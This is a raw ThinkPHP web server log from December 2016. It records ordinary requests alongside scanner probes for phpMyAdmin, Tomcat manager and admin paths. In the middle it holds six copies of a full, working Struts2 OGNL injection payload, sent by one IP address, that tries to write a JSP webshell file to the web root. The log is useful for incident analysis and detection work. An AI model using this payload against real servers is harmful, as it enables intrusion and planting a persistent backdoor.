[ 2016-12-01T02:04:37+08:00 ] 180.97.106.161 /check_proxy
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: 无法加载模块:Check_proxy

[ 2016-12-01T02:23:47+08:00 ] 163.172.134.70 /cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000074s ]

[ 2016-12-01T04:11:36+08:00 ] 218.29.141.26 /console/login/LoginForm.jsp
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000073s ]
ERR: 无法加载模块:Console

[ 2016-12-01T06:18:04+08:00 ] 80.82.78.38 /cache/global/img/gs.gif
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000062s ]

[ 2016-12-01T09:31:05+08:00 ] 64.233.172.140 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]

[ 2016-12-01T09:46:16+08:00 ] 222.126.176.8 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]

[ 2016-12-01T11:51:21+08:00 ] 118.130.137.38 /login.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000091s ]
ERR: 无法加载模块:Login

[ 2016-12-01T11:51:21+08:00 ] 118.130.137.38 /index.do?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000013s ]
INFO: [ app_init ] --END-- [ RunTime:0.000086s ]
ERR: 无法加载模块:Index

[ 2016-12-01T11:51:23+08:00 ] 118.130.137.38 /index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Index

[ 2016-12-01T11:51:24+08:00 ] 118.130.137.38 /loginAction.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000012s ]
INFO: [ app_init ] --END-- [ RunTime:0.000084s ]
ERR: 无法加载模块:LoginAction

[ 2016-12-01T11:51:24+08:00 ] 118.130.137.38 /admin/loginAction.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000058s ]
ERR: 无法加载模块:Admin

[ 2016-12-01T11:51:28+08:00 ] 118.130.137.38 /login/Jeecms.do?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23parameters.info1[0]),%23w.print(%23parameters.info2[0]),%23w.print(%23path),%23w.close(),1?%23xx:%23request.toString&shellname=lndex.jsp&shellContent=x&encoding=UTF-8&pp=%2f&info1=oko&info2=kok
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000064s ]
ERR: 无法加载模块:Login

[ 2016-12-01T14:52:36+08:00 ] 58.218.213.215 /login.action
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000061s ]
ERR: 无法加载模块:Login

[ 2016-12-01T14:57:52+08:00 ] 114.215.239.201 /admin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000010s ]
INFO: [ app_init ] --END-- [ RunTime:0.000067s ]
ERR: 无法加载模块:Admin

[ 2016-12-01T17:23:32+08:00 ] 123.125.71.41 /robots.txt
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000070s ]
ERR: 无法加载模块:Robots

[ 2016-12-01T18:05:56+08:00 ] 119.29.70.15 /phpmyadmin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000008s ]
INFO: [ app_init ] --END-- [ RunTime:0.000060s ]
ERR: 无法加载模块:Phpmyadmin

[ 2016-12-01T18:37:27+08:00 ] 104.223.133.108 /phpmyadmin
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000021s ]
INFO: [ app_init ] --END-- [ RunTime:0.000078s ]
ERR: 无法加载模块:Phpmyadmin

[ 2016-12-01T19:16:06+08:00 ] 111.166.60.250 /manager/html
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000009s ]
INFO: [ app_init ] --END-- [ RunTime:0.000072s ]
ERR: 无法加载模块:Manager

[ 2016-12-01T19:58:20+08:00 ] 101.94.208.205 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000022s ]
INFO: [ app_init ] --END-- [ RunTime:0.000079s ]

[ 2016-12-01T21:36:37+08:00 ] 101.94.208.205 /favicon.ico
INFO: [ app_init ] --START--
INFO: Run Behavior\BuildLiteBehavior [ RunTime:0.000028s ]
INFO: [ app_init ] --END-- [ RunTime:0.000093s ]

